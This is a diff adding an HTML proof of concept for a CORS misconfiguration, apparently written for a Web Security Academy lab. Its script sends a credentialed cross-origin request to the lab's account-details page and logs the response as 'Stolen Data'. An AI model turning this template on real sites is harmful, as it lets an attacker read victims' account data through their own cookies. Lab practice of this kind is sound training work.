@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Misconfiguration PoC</h1>
+
+    <script>
+      // Attempt to access user data from vulnerable site
+      fetch('https://0a91003404b6c01c8090033a0023000f.web-security-academy.net/accountDetails', {
+        method: 'GET',
+        credentials: 'include'  // Important: Send cookies automatically
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Stolen Data:', data);
+      })
+      .catch(err => console.error('Exploit failed:', err));
+    </script>
+  </body>
+</html>
